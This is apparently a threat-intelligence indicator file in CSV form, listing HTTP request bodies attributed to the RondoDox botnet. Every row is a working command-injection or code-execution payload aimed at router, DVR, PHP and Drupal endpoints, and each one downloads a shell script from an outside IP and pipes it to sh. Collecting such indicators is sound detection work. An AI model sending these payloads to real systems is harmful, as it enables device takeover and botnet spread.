Threat,Indicator Type,Indicator
RondoDox,HTTP Request Body,"<?php system('(wget -qO- http://74.194.191.52/rondo.dtm.sh||busybox wget -qO- http://74.194.191.52/rondo.dtm.sh||curl -s http://74.194.191.52/rondo.dtm.sh)|sh&'); ?>,10"
RondoDox,HTTP Request Body,"<?php system('(wget -qO- http://70.184.13.47/rondo.dtm.sh||busybox wget -qO- http://70.184.13.47/rondo.dtm.sh||curl -s http://70.184.13.47/rondo.dtm.sh)|sh&'); ?>,7"
RondoDox,HTTP Request Body,<string>(wget -qO- http://70.184.13.47/rondo.xcw.sh||busybox wget -qO- http://70.184.13.47/rondo.xcw.sh||curl -s http://70.184.13.47/rondo.xcw.sh)|sh&amp;</string>
RondoDox,HTTP Request Body,"command=%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.dcd.sh%7Csh%26echo%20,7"
RondoDox,HTTP Request Body,"command=busybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.qyz.sh%7Csh%26&SystemCommandSubmit=Apply,7"
RondoDox,HTTP Request Body,"html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0Abusybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.zta.sh%7Csh%26,7"
RondoDox,HTTP Request Body,"time_mode=0&time_YEAR=0&time_MONTH=0&time_DAY=0&time_HOUR=0&time_MINUTE=0&time_SECOND=0&TIMEZONE=50&year=&month=&day=&CONFIGURE_NTP=on&SPECIFIC_SERVER=%24%28wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.qbq.sh%7Csh%29&CONFIGURE_NTP_SYNC_BY_PRESET_TIME=on&SYNC_PRESET_TIME_HOURS=0,7"
RondoDox,HTTP Request Body,"{""action"":""set_timesetting"",""data"":{""ntpserver0"":""`wget -qO- http://70.184.13.47/rondo.cgc.sh|sh`"",""ntpserver1"":""time1.google.com"",""timezone"":""UTC-8""}},7"
RondoDox,HTTP Request Body,"(wget -qO- http://70.184.13.47/rondo.dgx.sh||busybox wget -qO- http://70.184.13.47/rondo.dgx.sh||curl -s http://70.184.13.47/rondo.dgx.sh)|sh&,6"
RondoDox,HTTP Request Body,"<?xml version=""1.0"" encoding=""UTF-8""?><DVR Platform=""Hi3520""><SetConfiguration File=""service.xml""><![CDATA[<?xml version=""1.0"" encoding=""UTF-8""?><DVR Platform=""Hi3520""><Service><NTP Enable=""True"" Interval=""20000"" Server=""time.nist.gov&busybox wget -qO- http://70.184.13.47/rondo.tkg.sh|sh&echo ""/></Service></DVR>]]></SetConfiguration></DVR>,6"
RondoDox,HTTP Request Body,"C1=ON&cmd=cgi_ntp_time&f_ntp_server=%60wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.djc.sh%7Csh%60,6"
RondoDox,HTTP Request Body,"XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=%3B%60busybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.zxb.sh%7Csh%60%3B&ipv=0,6"
RondoDox,HTTP Request Body,"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%28wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F70.184.13.47%2Frondo.txg.sh%29%7Csh,6"
RondoDox,HTTP Request Body,"action=ApplyTake&change_action=gozila_cgi&del_value=&next_page=Diagnostics.asp&ping_ip=busybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.gvt.sh%7Csh%26&submit_button=Ping&submit_type=start,6"
RondoDox,HTTP Request Body,"adj_time_sec=32&change_action=gozila_cgi&adj_time_day=27&adj_time_mon=10&adj_time_hour=11&adj_time_year=%24%28busybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.gvt.sh%7Csh%29&adj_time_min=35&submit_button=index&action=Save&submit_type=adjust_sys_time,6"
RondoDox,HTTP Request Body,"cgiName=time_tzsetup.cgi&page=%2Fcfg_system_time.htm&id=69&ntp=%60curl%20-s%20http%3A%2F%2F70.184.13.47%2Frondo.qyt.sh%7Csh%60&ntp1=time.stdtime.gov.tw&ntp2=%600123456789ABCDEF%60&isEnabled=0&timeDiff=%2B9&ntpAutoSync=1&ntpSyncMode=1&day=0&hour=0&min=0&syncDiff=30,6"
RondoDox,HTTP Request Body,"f_smtpserver=%3Bwget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.djc.sh%7Csh%26,6"
RondoDox,HTTP Request Body,"form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=%28wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.bxf.sh%7C%7Ccurl%20-s%20http%3A%2F%2F70.184.13.47%2Frondo.bxf.sh%29%7Csh%26,6"
RondoDox,HTTP Request Body,"macAddress=112233445566%3Bbusybox%20wget%20-qO-%20http%3A%2F%2F70.184.13.47%2Frondo.tha.sh%7Csh%20%23&reginfo=0&writeData=Submit,6"
